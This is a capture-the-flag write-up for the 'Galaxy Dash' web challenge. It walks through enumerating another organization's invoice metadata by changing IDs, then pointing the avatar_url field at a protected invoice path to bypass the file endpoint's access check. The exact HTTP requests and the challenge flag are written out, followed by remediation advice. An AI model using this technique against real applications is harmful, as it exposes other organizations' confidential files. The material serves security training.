# Galaxy Dash — galaxydash-010 — You don't have ownership of the target file, but there might be another way to access it?

## Challenge Overview

- **Challenge:** Galaxy Dash
- **Platform:** Bugforge
- **Category:** Web Security
- **Primary vulnerability:** Broken access control through avatar path manipulation
- **Related vulnerability:** Insecure Direct Object Reference (IDOR) / Server Side Request Forgery (SSRF)

### Challenge Hint

> You don't have ownership of the target file, but there might be another way to access it?

## Objective

Investigate the Intergalactic Delivery web application, identify an alternative way to access a protected invoice file, and retrieve the challenge flag.

## 1. Register an Organization

1. Open the Galaxy Dash web application.
2. Register a business organization and log in.
3. Navigate to the dashboard.
4. Select **Book New Delivery**.
5. Choose the required delivery options and create a booking.

After creating the booking, inspect the requests in the browser's Developer Tools or Burp Suite.

## 2. Inspect the Booking API

The application retrieves booking information through the following endpoint:

```http
GET /api/bookings/4
```

The response contains booking information, including the organization ID, creator ID, destination, delivery service, price, and status.

The response also reveals that the application generates an invoice associated with the booking.

## 3. Discover the Invoice API

Inspect the following endpoint:

```http
GET /api/invoices/4
```

The response includes invoice metadata such as:

- Invoice number
- Booking ID
- Line items
- Subtotal, tax, and total
- Server-side invoice file path

Example response fields:

```json
{
  "id": 4,
  "booking_id": 4,
  "invoice_number": "GD-2026-000004",
  "file_path": "/app/invoices/GD-2026-000004.txt"
}
```

The `file_path` value reveals the location of the invoice on the server.

## 4. Test for IDOR

Change the invoice identifier from `4` to `1`:

```http
GET /api/invoices/1
```

The application returns another invoice's metadata, including its invoice number and file path.

Example:

```json
{
  "id": 1,
  "booking_id": 1,
  "invoice_number": "GD-2026-000001",
  "file_path": "/app/invoices/GD-2026-000001.txt"
}
```

This demonstrates an authorization weakness because the authenticated account can access invoice metadata belonging to another record.

However, metadata access alone does not reveal the contents of the protected invoice file.

## 5. Discover the File Access Endpoint

Based on the invoice metadata, investigate the file endpoint.

First, test a numeric identifier:

```http
GET /api/files/4
```

Response:

```json
{
  "error": "File not found"
}
```

The endpoint appears to expect a filename rather than a numeric invoice ID.

Request the current organization's invoice using its filename:

```http
GET /api/files/GD-2026-000004.txt
```

The server returns the invoice contents, confirming that the endpoint provides access to invoice files.

Next, try the other invoice:

```http
GET /api/files/GD-2026-000001.txt
```

Response:

```json
{
  "error": "Access denied"
}
```

This indicates that the file endpoint applies an access-control check to the requested file.

## 6. Investigate the Organization Avatar Feature

Navigate to:

**Organization → Update Avatar**

The avatar form accepts a file path through the `avatar_url` field.

Instead of supplying a normal image URL, submit the protected invoice's server-side path:

```http
PUT /api/organization/avatar
Content-Type: application/json

{
  "avatar_url": "/app/invoices/GD-2026-000001.txt"
}
```

Response:

```json
{
  "message": "Avatar updated successfully"
}
```

The application accepts the path even though it points to a protected invoice file rather than an ordinary avatar image.

## 7. Retrieve the Protected Invoice

Return to the file endpoint and request the same invoice filename again:

```http
GET /api/files/GD-2026-000001.txt
```

This time, the server returns the invoice contents, including the confidential internal-use section and the challenge flag.

### Flag

```text
bug{IngGC1aewQJIAWw4DNUDc5iipQnmutHH}
```

## Vulnerability Analysis

### Primary Finding: Avatar Path Manipulation

The organization avatar endpoint accepts a server-side filesystem path without adequately restricting it to permitted avatar resources.

The observed behavior indicates that updating the avatar path affects whether the protected invoice can subsequently be retrieved. The exact internal authorization logic cannot be confirmed without access to the backend implementation.

### Related Finding: Invoice IDOR

The invoice API allows access to another invoice's metadata by changing the numeric identifier.

This exposes information about invoices that do not belong to the authenticated user's organization.

### Impact

- Unauthorized access to invoice metadata.
- Exposure of confidential invoice contents.
- Potential disclosure of sensitive internal information.
- Challenge flag retrieval through the alternate file-access path.

## Recommended Remediations

1. **Validate avatar uploads:** Accept actual image uploads or strictly validate URLs against an allowlist of permitted sources.
2. **Prevent arbitrary file access:** Never allow user-controlled paths to determine unrestricted filesystem access.
3. **Enforce authorization consistently:** Verify organization ownership on every invoice metadata and file request.
4. **Use safe file identifiers:** Map opaque identifiers to server-managed files rather than accepting raw paths.
5. **Validate file types:** Restrict avatars to approved image formats and verify file contents.
6. **Add regression tests:** Ensure that changing an avatar cannot grant access to protected invoices and that cross-organization invoice requests are denied.

## Conclusion

The Galaxy Dash challenge demonstrates how multiple access-control weaknesses can combine into a successful attack.

The investigation began with invoice metadata enumeration and an IDOR discovery. The file endpoint then revealed an authorization boundary, and the organization avatar feature provided an alternative path that allowed retrieval of the protected invoice.

The key lesson is to investigate how different application features interact with server-side resources. A security control enforced by one endpoint may be ineffective if another endpoint can influence the same resource or its authorization state.